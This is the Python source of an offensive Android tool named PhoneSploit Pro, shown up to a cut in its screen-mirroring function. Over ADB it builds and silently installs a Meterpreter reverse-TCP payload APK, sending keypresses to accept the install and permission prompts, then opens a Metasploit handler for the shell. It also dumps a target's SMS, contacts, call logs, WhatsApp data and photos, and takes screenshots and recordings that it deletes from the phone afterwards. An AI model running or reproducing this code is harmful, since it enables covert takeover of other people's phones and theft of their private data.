"""
Script : PhoneSploit Pro
Author : Mohd Azeem (github.com/AzeemIdrisi)
"""

import os
import random
import socket
import time
import subprocess
import platform
import datetime
from modules import banner
from modules import color


def start():
    # Checking OS
    global operating_system
    operating_system = platform.system()
    if operating_system == 'Windows':
        # Windows specific configuration
        windows_config()
    else:
        # On Linux / macOS
        import readline  # Arrow Key
        # Creates a folder to store pulled files
        os.system('mkdir -p Downloaded-Files')
        check_packages()  # Checking for required packages


def windows_config():
    global clear, opener, move
    clear = 'cls'
    opener = 'start'
    move = 'move'
    # Creates a folder to store pulled files
    os.system('if not exist Downloaded-Files mkdir Downloaded-Files')


def check_packages():
    adb_status = subprocess.call(['which', 'adb'])
    if adb_status != 0:
        print(f'\n{color.RED}ERROR : ADB is NOT installed!\n')
        print(f'\n{color.CYAN}Please install Android-Tools (adb){color.WHITE}\n')

        choice = input(
            '\nDo you still want to continue to PhoneSploit Pro?     Y / N > ').lower()
        if choice == 'y' or choice == '':
            return
        elif choice == 'n':
            exit_phonesploit_pro()
            return
        else:
            while choice != 'y' and choice != 'n' and choice != '':
                choice = input(
                    '\nInvalid choice!, Press Y or N > ').lower()
                if choice == 'y' or choice == '':
                    return
                elif choice == 'n':
                    exit_phonesploit_pro()
                    return

    metasploit_status = subprocess.call(['which', 'msfconsole'])
    if metasploit_status != 0:
        print(f'\n{color.RED}ERROR : Metasploit-Framework is NOT installed!\n')
        print(f'\n{color.CYAN}Please install Metasploit-Framework{color.WHITE}\n')

        choice = input(
            '\nDo you still want to continue to PhoneSploit Pro?     Y / N > ').lower()
        if choice == 'y' or choice == '':
            return
        elif choice == 'n':
            exit_phonesploit_pro()
            return
        else:
            while choice != 'y' and choice != 'n' and choice != '':
                choice = input(
                    '\nInvalid choice!, Press Y or N > ').lower()
                if choice == 'y' or choice == '':
                    return
                elif choice == 'n':
                    exit_phonesploit_pro()
                    return

    scrcpy_status = subprocess.call(['which', 'scrcpy'])
    if scrcpy_status != 0:
        print(f'\n{color.RED}ERROR : scrcpy is NOT installed!\n')
        print(f'\n{color.CYAN}Please install scrcpy{color.WHITE}\n')

        choice = input(
            '\nDo you still want to continue to PhoneSploit Pro?     Y / N > ').lower()
        if choice == 'y' or choice == '':
            return
        elif choice == 'n':
            exit_phonesploit_pro()
            return
        else:
            while choice != 'y' and choice != 'n' and choice != '':
                choice = input(
                    '\nInvalid choice!, Press Y or N > ').lower()
                if choice == 'y' or choice == '':
                    return
                elif choice == 'n':
                    exit_phonesploit_pro()
                    return


def display_menu():
    """ Displays banner and menu"""
    print(selected_banner, page)


def clear_screen():
    """ Clears the screen and display menu """
    os.system(clear)
    display_menu()


def change_page(name):
    global page, page_number
    if name == 'p':
        if page_number > 0:
            page_number = page_number - 1
    elif name == 'n':
        if page_number < 2:
            page_number = page_number + 1
    page = banner.menu[page_number]
    clear_screen()


def connect():
    # Connect only 1 device at a time
    # Restart ADB on new connection.
    os.system(
        'adb kill-server > hidden.txt 2>&1&&adb start-server > hidden.txt 2>&1')
    # print("\n")
    # os.system("adb tcpip 5555")
    print(f"\n{color.CYAN}Enter target phone's IP Address       {color.YELLOW}Example : 192.168.1.23{color.WHITE}")
    ip = input("> ")
    if ip == '':
        print(
            f'\n{color.RED}Null Input\n{color.GREEN}Going back to Main Menu...{color.WHITE}')
    else:
        os.system("adb connect " + ip + ":5555")


def list_devices():
    print("\n")
    os.system("adb devices -l")
    print("\n")


def disconnect():
    print("\n")
    os.system("adb disconnect")
    print("\n")


def exit_phonesploit_pro():
    global run_phonesploit_pro
    run_phonesploit_pro = False
    print("\nExiting...\n")


def get_shell():
    print("\n")
    os.system("adb shell")


def get_screenshot():
    global screenshot_location
    # Getting a temporary file name to store time specific results
    file_name = f'screenshot-{datetime.datetime.now().year}-{datetime.datetime.now().month}-{datetime.datetime.now().day}-{datetime.datetime.now().hour}-{datetime.datetime.now().minute}-{datetime.datetime.now().second}.png'
    os.system(f"adb shell screencap -p /sdcard/{file_name}")
    if screenshot_location == '':
        print(
            f"\n{color.YELLOW}Enter location to save all screenshots, Press 'Enter' for default{color.WHITE}")
        screenshot_location = input("> ")
    if screenshot_location == "":
        screenshot_location = 'Downloaded-Files'
        print(
            f"\n{color.PURPLE}Saving screenshot to PhoneSploit-Pro/{screenshot_location}\n{color.WHITE}")
    else:
        print(
            f"\n{color.PURPLE}Saving screenshot to {screenshot_location}\n{color.WHITE}")

    os.system(f"adb pull /sdcard/{file_name} {screenshot_location}")

    # Asking to open file
    choice = input(
        f'\n{color.GREEN}Do you want to Open the file?     Y / N {color.WHITE}> ').lower()
    if choice == 'y' or choice == '':
        os.system(f"{opener} {screenshot_location}/{file_name}")

    elif not choice == 'n':
        while choice != 'y' and choice != 'n' and choice != '':
            choice = input(
                '\nInvalid choice!, Press Y or N > ').lower()
            if choice == 'y' or choice == '':
                os.system(f"{opener} {screenshot_location}/{file_name}")

    print("\n")


def screenrecord():
    global screenrecord_location
    # Getting a temporary file name to store time specific results
    file_name = f'vid-{datetime.datetime.now().year}-{datetime.datetime.now().month}-{datetime.datetime.now().day}-{datetime.datetime.now().hour}-{datetime.datetime.now().minute}-{datetime.datetime.now().second}.mp4'

    duration = input(
        f"\n{color.CYAN}Enter the recording duration (in seconds) > {color.WHITE}")
    print(f'\n{color.YELLOW}Starting Screen Recording...\n{color.WHITE}')
    os.system(
        f"adb shell screenrecord --verbose --time-limit {duration} /sdcard/{file_name}")

    if screenrecord_location == '':
        print(
            f"\n{color.YELLOW}Enter location to save all videos, Press 'Enter' for default{color.WHITE}")
        screenrecord_location = input("> ")
    if screenrecord_location == "":
        screenrecord_location = 'Downloaded-Files'
        print(
            f"\n{color.PURPLE}Saving video to PhoneSploit-Pro/{screenrecord_location}\n{color.WHITE}")
    else:
        print(
            f"\n{color.PURPLE}Saving video to {screenrecord_location}\n{color.WHITE}")

    os.system(f"adb pull /sdcard/{file_name} {screenrecord_location}")

    # Asking to open file
    choice = input(
        f'\n{color.GREEN}Do you want to Open the file?     Y / N {color.WHITE}> ').lower()
    if choice == 'y' or choice == '':
        os.system(f"{opener} {screenrecord_location}/{file_name}")

    elif not choice == 'n':
        while choice != 'y' and choice != 'n' and choice != '':
            choice = input(
                '\nInvalid choice!, Press Y or N > ').lower()
            if choice == 'y' or choice == '':
                os.system(f"{opener} {screenrecord_location}/{file_name}")
    print("\n")


def pull_file():
    global pull_location
    print(f"\n{color.CYAN}Enter file path           {color.YELLOW}Example : /sdcard/Download/sample.jpg{color.WHITE}")
    location = input("\n> /sdcard/")
    if pull_location == '':
        print(
            f"\n{color.YELLOW}Enter location to save all files, Press 'Enter' for default{color.WHITE}")
        pull_location = input("> ")
    if pull_location == "":
        pull_location = 'Downloaded-Files'
        print(
            f"\n{color.PURPLE}Saving file to PhoneSploit-Pro/{pull_location}\n{color.WHITE}")
    else:
        print(f"\n{color.PURPLE}Saving file to {pull_location}\n{color.WHITE}")
    os.system(f'adb pull /sdcard/{location} {pull_location}')

    # Asking to open file
    choice = input(
        f'\n{color.GREEN}Do you want to Open the file?     Y / N {color.WHITE}> ').lower()

    # updating location = file_name if it existed inside a folder
    # Example : sdcard/DCIM/longtime.jpg -> longtime.jpg
    file_path = location.split('/')
    location = file_path[len(file_path) - 1]

    # processing request
    if choice == 'y' or choice == '':
        os.system(f"{opener} {pull_location}/{location}")

    elif not choice == 'n':
        while choice != 'y' and choice != 'n' and choice != '':
            choice = input(
                '\nInvalid choice!, Press Y or N > ').lower()
            if choice == 'y' or choice == '':
                os.system(f"{opener} {pull_location}/{location}")


def push_file():
    location = input(f"\n{color.CYAN}Enter file path{color.WHITE} > ")
    if location == '':
        print(
            f'\n{color.RED}Null Input\n{color.GREEN}Going back to Main Menu...{color.WHITE}')
    else:
        destination = input(
            f"\n{color.CYAN}Enter destination path              {color.YELLOW}Example : /sdcard/Documents{color.WHITE}\n> /sdcard/")
        os.system("adb push " + location + " /sdcard/" + destination)


def stop_adb():
    os.system("adb kill-server")
    print("\nStopped ADB Server")


def install_app():
    file_location = input(f"\n{color.CYAN}Enter APK path{color.WHITE} > ")

    if file_location == '':
        print(
            f'\n{color.RED}Null Input\n{color.GREEN}Going back to Main Menu...{color.WHITE}')
    else:
        os.system("adb install " + file_location)
        print("\n")


def uninstall_app():
    print(
        f"\n{color.CYAN}Enter package name     {color.WHITE}Example : com.spotify.music ")
    package_name = input("> ")

    if package_name == '':
        print(
            f'\n{color.RED}Null Input\n{color.GREEN}Going back to Main Menu...{color.WHITE}')
    else:
        os.system("adb uninstall " + package_name)
        print("\n")


def launch_app():
    print(
        f"\n{color.CYAN}Enter package name.     {color.WHITE}Example : com.spotify.music ")
    package_name = input("> ")

    if package_name == '':
        print(
            f'\n{color.RED}Null Input\n{color.GREEN}Going back to Main Menu...{color.WHITE}')
    else:
        os.system("adb shell monkey -p " + package_name + " 1")
        print("\n")


def list_apps():
    print('''

    1. List third party packages
    2. List all packages
    ''')
    mode = (input("> "))
    if mode == '':
        print(
            f'\n{color.RED}Null Input\n{color.GREEN}Going back to Main Menu...{color.WHITE}')
    else:
        if mode == '1':
            os.system("adb shell pm list packages -3")
        elif mode == '2':
            os.system("adb shell pm list packages")
        print("\n")


def reboot(key):
    print(
        f'\n{color.RED}[Warning]{color.YELLOW} Restarting will disconnect the device{color.WHITE}')
    choice = input('\nDo you want to continue?     Y / N > ').lower()
    if choice == 'y' or choice == '':
        pass
    elif choice == 'n':
        return
    else:
        while choice != 'y' and choice != 'n' and choice != '':
            choice = input('\nInvalid choice!, Press Y or N > ').lower()
            if choice == 'y' or choice == '':
                pass
            elif choice == 'n':
                return

    if key == 'system':
        os.system('adb reboot')
    else:
        print(f'''
{color.WHITE}1.{color.GREEN} Reboot to Recovery Mode
{color.WHITE}2.{color.GREEN} Reboot to Bootloader
{color.WHITE}3.{color.GREEN} Reboot to Fastboot Mode
{color.WHITE}''')
        mode = (input("> "))
        if mode == '1':
            os.system('adb reboot recovery')
        elif mode == '2':
            os.system('adb reboot bootloader')
        elif mode == '3':
            os.system('adb reboot fastboot')
        else:
            print("\nInvalid selection, Going back to Main Menu")
            return

    print("\n")


def list_files():
    print('\n')
    os.system('adb shell ls -a /sdcard/')
    print('\n')


def get_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    return s.getsockname()[0]


def instructions():
    """Prints instructions for Metasploit and returns user's choice"""
    os.system(clear)
    print(banner.instructions_banner + banner.instruction)
    choice = input('> ')
    if choice == '':
        return True
    else:
        return False


def hack():
    continue_hack = instructions()
    if continue_hack:
        os.system(clear)
        print(banner.hacking_banner)
        ip = get_ip_address()  # getting IP Address to create payload
        lport = '4444'
        print(
            f"\n{color.CYAN}Using LHOST : {color.WHITE}{ip}{color.CYAN} & LPORT : {color.WHITE}{lport}{color.CYAN} to create payload\n{color.WHITE}")

        choice = input(
            f"\n{color.YELLOW}Press 'Enter' to continue OR enter 'M' to modify LHOST & LPORT > {color.WHITE}").lower()

        if choice == 'm':
            ip = input(f"\n{color.CYAN}Enter LHOST > {color.WHITE}")
            lport = input(f"\n{color.CYAN}Enter LPORT > {color.WHITE}")
        elif choice != '':
            while choice != 'm' and choice != '':
                choice = input(
                    f"\n{color.RED}Invalid selection! , Press 'Enter' OR M > {color.WHITE}").lower()
                if choice == 'm':
                    ip = input(f"\n{color.CYAN}Enter LHOST > {color.WHITE}")
                    lport = input(f"\n{color.CYAN}Enter LPORT > {color.WHITE}")

        print(f"\n{color.CYAN}Creating payload APK...\n{color.WHITE}")
        # creating payload
        os.system(
            f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={lport} > test.apk")
        print(f"\n{color.CYAN}Installing APK to target device...{color.WHITE}\n")

        # installing apk to device
        if operating_system == 'Windows':
            # (used 'start /b' to execute command in background)
            os.system("start /b adb install test.apk")
        else:
            # (used ' &' to execute command in background)
            os.system("adb install test.apk &")
        time.sleep(5)  # waiting for apk to be installed

        # Keyboard input to accept app install
        print(
            f"\n{color.CYAN}Sending keycodes to accept the app installation\n{color.WHITE}")
        os.system('adb shell input keyevent 20')
        os.system('adb shell input keyevent 20')
        os.system('adb shell input keyevent 66')

        print(f"\n{color.CYAN}Launching app...\n{color.WHITE}")
        package_name = "com.metasploit.stage"  # payload package name
        os.system("adb shell monkey -p " + package_name + " 1")
        time.sleep(3)  # waiting for app to launch

        # Keyboard input to accept app permissions
        print(
            f"\n{color.CYAN}Sending keycodes to accept the app permissions\n{color.WHITE}")
        os.system('adb shell input keyevent 22')
        os.system('adb shell input keyevent 22')
        os.system('adb shell input keyevent 66')

        # Launching Metasploit
        print(
            f"\n{color.RED}Launching and Setting up Metasploit-Framework\n{color.WHITE}")
        os.system(
            f"msfconsole -x 'use exploit/multi/handler ; set PAYLOAD android/meterpreter/reverse_tcp ; set LHOST {ip} ; set LPORT {lport} ; exploit'")
    else:
        print('\nGoing Back to Main Menu...\n')


def copy_whatsapp():
    global pull_location
    if pull_location == '':
        print(
            f"\n{color.YELLOW}Enter location to save WhatsApp Data, Press 'Enter' for default{color.WHITE}")
        pull_location = input("> ")
    if pull_location == "":
        pull_location = 'Downloaded-Files'
        print(
            f"\n{color.PURPLE}Saving data to PhoneSploit-Pro/{pull_location}\n{color.WHITE}")
    else:
        print(f"\n{color.PURPLE}Saving data to {pull_location}\n{color.WHITE}")

    location = '/sdcard/Android/media/com.whatsapp/WhatsApp'
    # 'test -d' checks if directory exist or not
    folder_status = os.system(f'adb shell test -d {location}')

    # If WhatsApp exists in Android
    if folder_status == 0:
        location = '/sdcard/Android/media/com.whatsapp/WhatsApp'
    else:
        location = '/sdcard/WhatsApp'

    os.system(f"adb pull {location} {pull_location}")
    print('\n')


def copy_screenshots():
    global pull_location
    if pull_location == '':
        print(
            f"\n{color.YELLOW}Enter location to save all Screenshots, Press 'Enter' for default{color.WHITE}")
        pull_location = input("> ")

    if pull_location == "":
        pull_location = 'Downloaded-Files'
        print(
            f"\n{color.PURPLE}Saving Screenshots to PhoneSploit-Pro/{pull_location}\n{color.WHITE}")
    else:
        print(
            f"\n{color.PURPLE}Saving Screenshots to {pull_location}\n{color.WHITE}")

    location = '/sdcard/Pictures/Screenshots'
    os.system(f"adb pull {location} {pull_location}")
    print('\n')


def copy_camera():
    global pull_location
    if pull_location == '':
        print(
            f"\n{color.YELLOW}Enter location to save all Photos, Press 'Enter' for default{color.WHITE}")
        pull_location = input("> ")
    if pull_location == "":
        pull_location = 'Downloaded-Files'
        print(
            f"\n{color.PURPLE}Saving Photos to PhoneSploit-Pro/{pull_location}\n{color.WHITE}")
    else:
        print(f"\n{color.PURPLE}Saving Photos to {pull_location}\n{color.WHITE}")

    location = '/sdcard/DCIM/Camera'
    os.system(f"adb pull {location} {pull_location}")
    print('\n')


def anonymous_screenshot():
    global screenshot_location
    # Getting a temporary file name to store time specific results
    file_name = f'screenshot-{datetime.datetime.now().year}-{datetime.datetime.now().month}-{datetime.datetime.now().day}-{datetime.datetime.now().hour}-{datetime.datetime.now().minute}-{datetime.datetime.now().second}.png'
    os.system(f"adb shell screencap -p /sdcard/{file_name}")
    if screenshot_location == '':
        print(
            f"\n{color.YELLOW}Enter location to save all screenshots, Press 'Enter' for default{color.WHITE}")
        screenshot_location = input("> ")
    if screenshot_location == "":
        screenshot_location = 'Downloaded-Files'
        print(
            f"\n{color.PURPLE}Saving screenshot to PhoneSploit-Pro/{screenshot_location}\n{color.WHITE}")
    else:
        print(
            f"\n{color.PURPLE}Saving screenshot to {screenshot_location}\n{color.WHITE}")

    os.system(f"adb pull /sdcard/{file_name} {screenshot_location}")

    print(f'\n{color.YELLOW}Deleting screenshot from Target\'s device\n{color.WHITE}')
    os.system(f"adb shell rm /sdcard/{file_name}")

    # Asking to open file
    choice = input(
        f'\n{color.GREEN}Do you want to Open the file?     Y / N {color.WHITE}> ').lower()
    if choice == 'y' or choice == '':
        os.system(f"{opener} {screenshot_location}/{file_name}")

    elif not choice == 'n':
        while choice != 'y' and choice != 'n' and choice != '':
            choice = input(
                '\nInvalid choice!, Press Y or N > ').lower()
            if choice == 'y' or choice == '':
                os.system(f"{opener} {screenshot_location}/{file_name}")

    print("\n")


def anonymous_screenrecord():
    global screenrecord_location
    # Getting a temporary file name to store time specific results
    file_name = f'vid-{datetime.datetime.now().year}-{datetime.datetime.now().month}-{datetime.datetime.now().day}-{datetime.datetime.now().hour}-{datetime.datetime.now().minute}-{datetime.datetime.now().second}.mp4'

    duration = input(
        f"\n{color.CYAN}Enter the recording duration (in seconds) > {color.WHITE}")
    print(f'\n{color.YELLOW}Starting Screen Recording...\n{color.WHITE}')
    os.system(
        f"adb shell screenrecord --verbose --time-limit {duration} /sdcard/{file_name}")

    if screenrecord_location == '':
        print(
            f"\n{color.YELLOW}Enter location to save all videos, Press 'Enter' for default{color.WHITE}")
        screenrecord_location = input("> ")
    if screenrecord_location == "":
        screenrecord_location = 'Downloaded-Files'
        print(
            f"\n{color.PURPLE}Saving video to PhoneSploit-Pro/{screenrecord_location}\n{color.WHITE}")
    else:
        print(
            f"\n{color.PURPLE}Saving video to {screenrecord_location}\n{color.WHITE}")

    os.system(f"adb pull /sdcard/{file_name} {screenrecord_location}")

    print(f'\n{color.YELLOW}Deleting video from Target\'s device\n{color.WHITE}')
    os.system(f"adb shell rm /sdcard/{file_name}")
    # Asking to open file
    choice = input(
        f'\n{color.GREEN}Do you want to Open the file?     Y / N {color.WHITE}> ').lower()
    if choice == 'y' or choice == '':
        os.system(f"{opener} {screenrecord_location}/{file_name}")

    elif not choice == 'n':
        while choice != 'y' and choice != 'n' and choice != '':
            choice = input(
                '\nInvalid choice!, Press Y or N > ').lower()
            if choice == 'y' or choice == '':
                os.system(f"{opener} {screenrecord_location}/{file_name}")
    print("\n")


def use_keycode():
    keycodes = True
    os.system(clear)
    print(banner.keycode_menu)
    while keycodes:
        print(f"\n {color.CYAN}99 : Clear Screen                0 : Main Menu")
        keycode_option = input(
            f"{color.RED}\n[KEYCODE] {color.WHITE}Enter selection > ").lower()

        match keycode_option:
            case '0':
                keycodes = False
                display_menu()
            case '99':
                os.system(clear)
                print(banner.keycode_menu)
            case '1':
                text = input(f'\n{color.CYAN}Enter text > {color.WHITE}')
                os.system(f'adb shell input text "{text}"')
                print(f'{color.YELLOW}\nEntered {color.WHITE}"{text}"')
            case '2':
                os.system('adb shell input keyevent 3')
                print(f'{color.YELLOW}\nPressed Home Button{color.WHITE}')
            case '3':
                os.system('adb shell input keyevent 4')
                print(f'{color.YELLOW}\nPressed Back Button{color.WHITE}')
            case '4':
                os.system('adb shell input keyevent 187')
                print(f'{color.YELLOW}\nPressed Recent Apps Button{color.WHITE}')
            case '5':
                os.system('adb shell input keyevent 26')
                print(f'{color.YELLOW}\nPressed Power Key{color.WHITE}')
            case '6':
                os.system('adb shell input keyevent 19')
                print(f'{color.YELLOW}\nPressed DPAD Up{color.WHITE}')
            case '7':
                os.system('adb shell input keyevent 20')
                print(f'{color.YELLOW}\nPressed DPAD Down{color.WHITE}')
            case '8':
                os.system('adb shell input keyevent 21')
                print(f'{color.YELLOW}\nPressed DPAD Left{color.WHITE}')
            case '9':
                os.system('adb shell input keyevent 22')
                print(f'{color.YELLOW}\nPressed DPAD Right{color.WHITE}')
            case '10':
                os.system('adb shell input keyevent 67')
                print(f'{color.YELLOW}\nPressed Delete/Backspace{color.WHITE}')
            case '11':
                os.system('adb shell input keyevent 66')
                print(f'{color.YELLOW}\nPressed Enter{color.WHITE}')
            case '12':
                os.system('adb shell input keyevent 24')
                print(f'{color.YELLOW}\nPressed Volume Up{color.WHITE}')
            case '13':
                os.system('adb shell input keyevent 25')
                print(f'{color.YELLOW}\nPressed Volume Down{color.WHITE}')
            case '14':
                os.system('adb shell input keyevent 126')
                print(f'{color.YELLOW}\nPressed Media Play{color.WHITE}')
            case '15':
                os.system('adb shell input keyevent 127')
                print(f'{color.YELLOW}\nPressed Media Pause{color.WHITE}')
            case '16':
                os.system('adb shell input keyevent 61')
                print(f'{color.YELLOW}\nPressed Tab Key{color.WHITE}')
            case '17':
                os.system('adb shell input keyevent 111')
                print(f'{color.YELLOW}\nPressed Esc Key{color.WHITE}')

            case other:
                print("\nInvalid selection!\n")


def open_link():
    print(f'\n{color.YELLOW}Enter URL              {color.CYAN}Example : https://github.com {color.WHITE}')
    url = input('> ')

    if url == '':
        print(
            f'\n{color.RED}Null Input\n{color.GREEN}Going back to Main Menu...{color.WHITE}')
    else:
        print(f'\n{color.YELLOW}Opening "{url}" on device        \n{color.WHITE}')
        os.system(f'adb shell am start -a android.intent.action.VIEW -d {url}')
        print('\n')


def open_photo():
    location = input(
        f"\n{color.YELLOW}Enter file path to upload Photo{color.WHITE} > ")

    if location == '':
        print(
            f'\n{color.RED}Null Input\n{color.GREEN}Going back to Main Menu...{color.WHITE}')
    else:

        os.system("adb push " + location + " /sdcard/")
        file_path = location.split('/')
        file_name = file_path[len(file_path) - 1]

        # Reverse slash ('\') splitting for Windows only
        global operating_system
        if operating_system == 'Windows':
            file_path = file_name.split('\\')
            file_name = file_path[len(file_path) - 1]

        file_name = file_name.replace("'", '')
        file_name = "'" + file_name + "'"
        print(file_name)
        print(f'\n{color.YELLOW}Opening Photo on device        \n{color.WHITE}')
        os.system(
            f'adb shell am start -n com.android.chrome/com.google.android.apps.chrome.Main -d "file:///sdcard/{file_name}" -t image/jpeg')  # -a android.intent.action.VIEW
        print('\n')


def open_audio():
    location = input(
        f"\n{color.YELLOW}Enter file path to upload Audio{color.WHITE} > ")

    if location == '':
        print(
            f'\n{color.RED}Null Input\n{color.GREEN}Going back to Main Menu...{color.WHITE}')
    else:
        os.system("adb push " + location + " /sdcard/")

        file_path = location.split('/')
        file_name = file_path[len(file_path) - 1]

        # Reverse slash ('\') splitting for Windows only
        global operating_system
        if operating_system == 'Windows':
            file_path = file_name.split('\\')
            file_name = file_path[len(file_path) - 1]

        file_name = file_name.replace("'", '')
        file_name = "'" + file_name + "'"
        print(file_name)
        print(f'\n{color.YELLOW}Playing Audio on device        \n{color.WHITE}')
        os.system(
            f'adb shell am start -n com.android.chrome/com.google.android.apps.chrome.Main -d "file:///sdcard/{file_name}" -t audio/mp3')

        print(
            f"\n{color.YELLOW}Waiting for 5 seconds before playing file.\n{color.WHITE}")
        time.sleep(5)
        # To play the file using Chrome
        os.system('adb shell input keyevent 126')
        print('\n')


def open_video():
    location = input(
        f"\n{color.YELLOW}Enter file path to upload Video{color.WHITE} > ")

    if location == '':
        print(
            f'\n{color.RED}Null Input\n{color.GREEN}Going back to Main Menu...{color.WHITE}')
    else:
        os.system("adb push " + location + " /sdcard/")

        file_path = location.split('/')
        file_name = file_path[len(file_path) - 1]

        # Reverse slash ('\') splitting for Windows only
        global operating_system
        if operating_system == 'Windows':
            file_path = file_name.split('\\')
            file_name = file_path[len(file_path) - 1]

        file_name = file_name.replace("'", '')
        file_name = "'" + file_name + "'"
        print(file_name)
        print(f'\n{color.YELLOW}Playing Video on device        \n{color.WHITE}')
        os.system(
            f'adb shell am start -n com.android.chrome/com.google.android.apps.chrome.Main -d "file:///sdcard/{file_name}" -t video/mp4')

        print(
            f"\n{color.YELLOW}Waiting for 5 seconds before playing file.\n{color.WHITE}")
        time.sleep(5)
        # To play the file using Chrome
        os.system('adb shell input keyevent 126')
        print('\n')


def get_device_info():
    model = os.popen(f'adb shell getprop ro.product.model').read()
    manufacturer = os.popen(
        f'adb shell getprop ro.product.manufacturer').read()
    chipset = os.popen(f'adb shell getprop ro.product.board').read()
    android = os.popen(f'adb shell getprop ro.build.version.release').read()
    security_patch = os.popen(
        f'adb shell getprop ro.build.version.security_patch').read()
    device = os.popen(f'adb shell getprop ro.product.vendor.device').read()
    sim = os.popen(f'adb shell getprop gsm.sim.operator.alpha').read()
    encryption_state = os.popen(f'adb shell getprop ro.crypto.state').read()
    build_date = os.popen(f'adb shell getprop ro.build.date').read()
    sdk_version = os.popen(f'adb shell getprop ro.build.version.sdk').read()
    wifi_interface = os.popen(f'adb shell getprop wifi.interface').read()

    print(f'''
{color.YELLOW}Model :{color.WHITE} {model}\
{color.YELLOW}Manufacturer :{color.WHITE} {manufacturer}\
{color.YELLOW}Chipset :{color.WHITE} {chipset}\
{color.YELLOW}Android Version :{color.WHITE} {android}\
{color.YELLOW}Security Patch :{color.WHITE} {security_patch}\
{color.YELLOW}Device :{color.WHITE} {device}\
{color.YELLOW}SIM :{color.WHITE} {sim}\
{color.YELLOW}Encryption State :{color.WHITE} {encryption_state}\
{color.YELLOW}Build Date :{color.WHITE} {build_date}\
{color.YELLOW}SDK Version :{color.WHITE} {sdk_version}\
{color.YELLOW}WiFi Interface :{color.WHITE} {wifi_interface}\
''')


def battery_info():
    battery = os.popen(f'adb shell dumpsys battery').read()
    print(f'''\n{color.YELLOW}Battery Information :
{color.WHITE}{battery}\n''')


def send_sms():
    print(
        f'\n{color.RED}[Warning] {color.CYAN}This feature is currently in BETA, Tested on Android 12 only{color.WHITE}')

    number = input(
        f'{color.YELLOW}\nEnter Phone number with country code{color.WHITE} (e.g. +91XXXXXXXXXX) > ')

    if number == '':
        print(
            f'\n{color.RED}Null Input\n{color.GREEN}Going back to Main Menu...{color.WHITE}')
    else:
        message = input(
            f'{color.YELLOW}\nEnter your message {color.WHITE}> ')

        print(f'{color.CYAN}\nSending SMS to {number} ...{color.WHITE}')
        os.system(
            f'adb shell service call isms 5 i32 0 s16 "com.android.mms.service" s16 "null" s16 "{number}" s16 "null" s16 "{message}" s16 "null" s16 "null" s16 "null" s16 "null"')


def unlock_device():
    password = input(
        f'{color.YELLOW}\nEnter password or Press \'Enter\' for blank{color.WHITE} > ')
    os.system('adb shell input keyevent 26')
    os.system('adb shell input swipe 200 900 200 300 200')
    if not password == '':  # if password is not blank
        os.system(f'adb shell input text "{password}"')
    os.system('adb shell input keyevent 66')
    print(f'{color.GREEN}\nDevice unlocked{color.WHITE}')


def lock_device():
    os.system('adb shell input keyevent 26')
    print(f'{color.GREEN}\nDevice locked{color.WHITE}')


def dump_sms():
    global pull_location
    if pull_location == '':
        print(
            f"\n{color.YELLOW}Enter location to save SMS file, Press 'Enter' for default{color.WHITE}")
        pull_location = input("> ")
    if pull_location == "":
        pull_location = 'Downloaded-Files'
        print(
            f"\n{color.PURPLE}Saving SMS file to PhoneSploit-Pro/{pull_location}\n{color.WHITE}")
    else:
        print(f"\n{color.PURPLE}Saving SMS file to {pull_location}\n{color.WHITE}")
    print(f'{color.GREEN}\nExtracting all SMS{color.WHITE}')
    file_name = f'sms_dump-{datetime.datetime.now().year}-{datetime.datetime.now().month}-{datetime.datetime.now().day}-{datetime.datetime.now().hour}-{datetime.datetime.now().minute}-{datetime.datetime.now().second}.txt'
    os.system(
        f'adb shell content query --uri content://sms/ --projection address:date:body > {pull_location}/{file_name}')


def dump_contacts():
    global pull_location
    if pull_location == '':
        print(
            f"\n{color.YELLOW}Enter location to save Contacts file, Press 'Enter' for default{color.WHITE}")
        pull_location = input("> ")
    if pull_location == "":
        pull_location = 'Downloaded-Files'
        print(
            f"\n{color.PURPLE}Saving Contacts file to PhoneSploit-Pro/{pull_location}\n{color.WHITE}")
    else:
        print(
            f"\n{color.PURPLE}Saving Contacts file to {pull_location}\n{color.WHITE}")
    print(f'{color.GREEN}\nExtracting all Contacts{color.WHITE}')
    file_name = f'contacts_dump-{datetime.datetime.now().year}-{datetime.datetime.now().month}-{datetime.datetime.now().day}-{datetime.datetime.now().hour}-{datetime.datetime.now().minute}-{datetime.datetime.now().second}.txt'
    os.system(
        f'adb shell content query --uri content://contacts/phones/  --projection display_name:number > {pull_location}/{file_name}')


def dump_call_logs():
    global pull_location
    if pull_location == '':
        print(
            f"\n{color.YELLOW}Enter location to save Call Logs file, Press 'Enter' for default{color.WHITE}")
        pull_location = input("> ")
    if pull_location == "":
        pull_location = 'Downloaded-Files'
        print(
            f"\n{color.PURPLE}Saving Call Logs file to PhoneSploit-Pro/{pull_location}\n{color.WHITE}")
    else:
        print(
            f"\n{color.PURPLE}Saving Call Logs file to {pull_location}\n{color.WHITE}")
    print(f'{color.GREEN}\nExtracting all Call Logs{color.WHITE}')
    file_name = f'call_logs_dump-{datetime.datetime.now().year}-{datetime.datetime.now().month}-{datetime.datetime.now().day}-{datetime.datetime.now().hour}-{datetime.datetime.now().minute}-{datetime.datetime.now().second}.txt'
    os.system(
        f'adb shell content query --uri content://call_log/calls --projection name:number:duration:date > {pull_location}/{file_name}')


def extract_apk():
    print(
        f"\n{color.CYAN}Enter package name     {color.WHITE}Example : com.spotify.music ")
    package_name = input("> ")

    if package_name == '':
        print(
            f'\n{color.RED}Null Input\n{color.GREEN}Going back to Main Menu...{color.WHITE}')
    else:

        global pull_location
        if pull_location == '':
            print(
                f"\n{color.YELLOW}Enter location to save APK file, Press 'Enter' for default{color.WHITE}")
            pull_location = input("> ")
        if pull_location == "":
            pull_location = 'Downloaded-Files'
            print(
                f"\n{color.PURPLE}Saving APK file to PhoneSploit-Pro/{pull_location}\n{color.WHITE}")
        else:
            print(
                f"\n{color.PURPLE}Saving APK file to {pull_location}\n{color.WHITE}")
        print(f'{color.GREEN}\nExtracting APK...{color.WHITE}')
        path = os.popen(f'adb shell pm path {package_name}').read()
        path = path.replace('package:', '')
        os.system(f'adb pull {path}')
        file_name = package_name.replace('.', '_')
        os.system(f'{move} base.apk {pull_location}/{file_name}.apk')

        print("\n")


def mirror():
    print(f'''
{color.WHITE}1.{color.GREEN} Default Mode
{color.WHITE}2.{color.GREEN} Custom Mode {color.YELLOW}(Tweak settings to increase performance)
{color.WHITE}''')
    mode = input("> ")
    if mode == '1' or mode == '':
        os.system('scrcpy')
    elif mode == '2':
        print(
